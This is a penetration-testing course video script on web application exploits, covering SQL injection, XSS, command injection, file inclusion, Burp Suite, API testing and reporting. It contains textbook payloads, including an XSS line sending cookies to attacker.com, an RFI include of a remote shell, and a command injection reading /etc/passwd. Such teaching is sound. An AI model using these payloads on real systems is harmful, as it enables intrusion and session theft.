# Video Script: Module 10 — Web Application Exploit Methods

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Segment 1 — Introduction (0:00–1:30)

Welcome back to CIS-4333 Penetration Testing. I am Professor Nash, and this is Module 10: Web Application Exploit Methods.

Web applications are the most common attack surface in modern enterprise environments. Nearly every organization exposes some form of web interface — internal portals, customer-facing apps, APIs, admin panels. For penetration testers, web application testing is not a specialty niche. It is a core competency.

In this module we cover the techniques attackers use to exploit web applications, the tools pentesters use to find those vulnerabilities, and how to document findings clearly for clients. By the end, you will understand SQL injection in multiple forms, cross-site scripting variants, injection attacks, authentication weaknesses, the OWASP Top 10 framework, Burp Suite workflows, and API testing.

This module maps directly to CompTIA PenTest+ Domain 3: Attacks and Exploits.

---

## Segment 2 — The Web Application Attack Surface (1:30–3:30)

Before we exploit anything, we need to understand what we are attacking.

A web application is a distributed system. The browser sends HTTP requests. A web server receives them. Application logic processes them. A backend database stores and retrieves data. Each layer is an attack surface.

The attack categories we focus on break into four groups.

First, injection attacks — SQL injection, command injection, LDAP injection, template injection. These occur when user input is passed to an interpreter without proper sanitization.

Second, client-side attacks — cross-site scripting and cross-site request forgery. These target the browser and the user rather than the server directly.

Third, authentication and session attacks — brute force, credential stuffing, session token theft, session fixation.

Fourth, access control and configuration attacks — directory traversal, file inclusion, insecure direct object references, server misconfigurations.

The OWASP Top 10 organizes the most critical web application risks. Pentesters use it as a checklist to ensure systematic coverage. We will reference it throughout this module.

---

## Segment 3 — SQL Injection (3:30–8:00)

SQL injection is one of the oldest and most impactful web vulnerabilities. It occurs when user-supplied input is concatenated into a SQL query without sanitization.

Consider a login form that builds this query:

```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT';
```

If the developer concatenates input directly, an attacker entering `' OR '1'='1` as the username produces:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

The condition `'1'='1'` is always true, bypassing authentication entirely.

### Union-Based Injection

Union-based injection extracts data from other tables by appending a UNION SELECT statement. The attacker first determines the number of columns in the original query by testing ORDER BY clauses incrementally. Then they inject:

```sql
' UNION SELECT null, username, password FROM admin_users --
```

The results from the injected query appear in the application response.

### Error-Based Injection

When the application displays database errors, attackers use functions like `EXTRACTVALUE()` in MySQL or `CONVERT()` in SQL Server to embed query results inside error messages. Error messages become a data exfiltration channel.

### Blind SQL Injection

Blind injection is more subtle. The application does not return data or errors — but behavior changes based on whether a condition is true or false.

Boolean-based blind injection asks true-or-false questions:

```sql
' AND SUBSTRING(password,1,1)='a' --
```

If the page responds normally, the first character of the password is 'a'. The attacker iterates through characters systematically.

Time-based blind injection uses sleep functions:

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5' --
```

A five-second delay confirms the condition is true.

### SQLMap

SQLMap automates SQL injection detection and exploitation. The basic command against a URL parameter is:

```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

The `--dbs` flag enumerates databases. From there, `--tables`, `--columns`, and `--dump` extract increasing levels of data. SQLMap handles union-based, error-based, and all blind techniques automatically.

Always run SQLMap within scope. The `--level` and `--risk` flags control aggressiveness. Level 5 and risk 3 are thorough but loud. Start conservative.

---

## Segment 4 — Cross-Site Scripting (8:00–11:30)

Cross-site scripting, or XSS, occurs when an application includes unvalidated user input in its HTML output, allowing attackers to inject and execute scripts in victims' browsers.

### Reflected XSS

Reflected XSS is the most common form. The malicious script is included in the HTTP request and reflected back in the response. A classic test payload is:

```html
<script>alert('XSS')</script>
```

If you see an alert box, the parameter is vulnerable. In real attacks, the payload steals cookies:

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

The attacker crafts a malicious link and tricks the victim into clicking it.

### Stored XSS

Stored XSS is more dangerous because the payload persists in the database. Every user who views the affected page executes the script. Comment fields, user profiles, and message boards are common vectors. A stored XSS in an admin panel can compromise privileged sessions.

### DOM-Based XSS

DOM-based XSS occurs entirely in the browser. The server sends a legitimate page, but client-side JavaScript reads attacker-controlled data — like the URL fragment — and writes it to the DOM unsafely. The payload never touches the server. Traditional server-side filters miss it entirely.

### XSS Impact

XSS enables session hijacking, credential phishing through fake login forms injected into legitimate pages, keylogging, and browser-based exploitation. The impact escalates dramatically when stored XSS reaches privileged users.

---

## Segment 5 — Injection Attacks Beyond SQL (11:30–13:30)

### Command Injection

Command injection occurs when user input is passed to operating system commands. A ping utility that builds its command as:

```bash
ping -c 1 INPUT
```

Is vulnerable to input like `127.0.0.1; cat /etc/passwd`. The semicolon terminates the ping command and executes the next one. Backticks and `$()` syntax achieve the same in bash.

Command injection is critical severity — it provides direct OS-level access.

### Directory Traversal

Directory traversal exploits insufficient path validation to read files outside the intended directory. The classic payload:

```
../../etc/passwd
```

If a file parameter like `?file=report.pdf` is processed without stripping traversal sequences, the application may return `/etc/passwd`. URL encoding (`%2e%2e%2f`) bypasses simple string filters.

### Local File Inclusion and Remote File Inclusion

File inclusion vulnerabilities arise when applications dynamically include files based on user input.

LFI reads files from the local server. Combining LFI with log poisoning — injecting PHP code into server logs, then including those logs — converts LFI to remote code execution.

RFI includes files from remote URLs. If `allow_url_include` is enabled in the PHP configuration, an attacker hosts a malicious PHP file and includes it via:

```
?page=http://attacker.com/shell.php
```

RFI directly provides code execution.

---

## Segment 6 — Authentication Attacks (13:30–15:30)

### Brute Force

Brute force systematically tries all possible passwords. Hydra and Medusa automate HTTP form attacks. The key parameters are the username list, password list, failure condition, and request format.

Rate limiting, account lockout, and CAPTCHA are the primary defenses. Pentesters must confirm lockout thresholds — too aggressive and you lock out legitimate users during an engagement.

### Credential Stuffing

Credential stuffing uses leaked username-password pairs from previous breaches. Because users reuse passwords across sites, valid credentials from one breach often work elsewhere. Tools like Burp Suite Intruder automate this. Checking breach databases during reconnaissance assesses client exposure.

### Session Hijacking

After authentication, the server issues a session token. If that token is predictable, transmitted over HTTP, or accessible via XSS, an attacker can impersonate the user without knowing their password. Cookie theft via XSS combined with `document.cookie` exfiltration is the most common path.

Session fixation attacks force a user to authenticate with a pre-known session token, giving the attacker immediate access after the victim logs in.

---

## Segment 7 — Burp Suite for Web App Testing (15:30–18:30)

Burp Suite is the industry-standard web application testing platform. The community edition is free. The professional edition adds active scanning and more Intruder attack types.

### Proxy and Intercept

Configure your browser to route traffic through Burp proxy at `127.0.0.1:8080`. Every request is intercepted, viewable, and modifiable before it reaches the server. This is fundamental to all Burp workflows.

### Repeater

The Repeater module lets you capture a request and resend it with modifications. This is your primary tool for manual injection testing. Modify a parameter, observe the response, iterate. Repeater is how you prove a vulnerability exists and understand its behavior.

### Intruder

Intruder automates parameterized requests. Mark insertion points in a request, choose an attack type — Sniper, Battering ram, Pitchfork, or Cluster bomb — and supply payload lists. Use Intruder for brute force attacks, parameter fuzzing, and testing injection payloads. The free edition rate-limits Intruder; the professional edition removes this cap.

### Scanner

Burp active scanner (professional edition) automatically crawls the application and tests for vulnerabilities. It finds many common issues — XSS, SQLi, path traversal — automatically. However, it cannot replace manual testing. Business logic flaws and context-dependent vulnerabilities require human judgment.

### Target Site Map

The Target tab builds a site map as you browse. It reveals hidden endpoints, API routes, and parameters that manual browsing might miss. Always review the full site map before beginning active testing.

---

## Segment 8 — API Testing and REST Endpoint Enumeration (18:30–21:00)

Modern applications increasingly rely on REST APIs. APIs are often less carefully hardened than traditional web interfaces and expose raw data operations directly.

### Discovering API Endpoints

Wordlists from SecLists combined with Gobuster or ffuf enumerate hidden API routes:

```bash
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

JavaScript files often contain API endpoint references. Burp passive scanning and manual review of JS source reveals endpoints the application consumes internally.

### Testing API Authentication

Many APIs use bearer tokens in the Authorization header. Test for missing authentication on sensitive endpoints — the API may enforce authentication on the web front end but omit it on direct API calls. Test each endpoint without a token first.

### Common API Vulnerabilities

Broken Object Level Authorization, also called IDOR, lets users access resources belonging to other users by changing an ID in the request. Replace `/api/users/1001/data` with `/api/users/1002/data` and observe if another user's data returns.

Excessive data exposure occurs when APIs return full objects and rely on the client to filter fields. The client shows three fields, but the API response contains twenty — including sensitive ones.

Mass assignment happens when an API blindly assigns request parameters to object fields. Sending `{"role":"admin"}` in a user update request may elevate privileges if the developer did not explicitly exclude protected fields.

---

## Segment 9 — Reporting Web Application Findings (21:00–22:30)

Web application findings require clear, reproducible documentation.

Every finding needs a title, CVSS score, affected URL and parameter, proof-of-concept showing the exact request and response, business impact, and remediation recommendation.

For SQL injection: document the exact payload, the database version or data extracted to prove impact, and recommend parameterized queries using prepared statements.

For XSS: include the payload, the cookie exfiltration proof-of-concept, and recommend output encoding and Content Security Policy headers.

For API vulnerabilities: document the exact endpoint, authentication state tested, and the data returned. BOLA findings should demonstrate two different user accounts to show cross-account access.

Screenshots and raw HTTP requests copied from Burp Repeater make findings irrefutable.

---

## Segment 10 — Module Summary (22:30–24:00)

Let us wrap up. In this module you learned:

- SQL injection including union-based, error-based, and blind variants, plus SQLMap automation
- XSS including reflected, stored, and DOM-based forms and their real-world impact
- Command injection, directory traversal, and file inclusion vulnerabilities
- Authentication attacks including brute force, credential stuffing, and session hijacking
- Burp Suite including proxy, Repeater, Intruder, and Scanner workflows
- API testing including endpoint enumeration, BOLA, excessive data exposure, and mass assignment

Web application testing requires patience, creativity, and systematic methodology. No automated scanner finds everything. Manual exploration — thinking about how the application processes your input — is what separates good pentesters from great ones.

Your lab this week puts Burp Suite and SQLMap to work against a deliberately vulnerable application. Your quiz covers the concepts from this lecture. Your discussion asks you to connect OWASP Top 10 rankings to real-world breaches.

I will see you in Module 11, where we move to wireless network assessment.

---

*End of Module 10 Video Script*
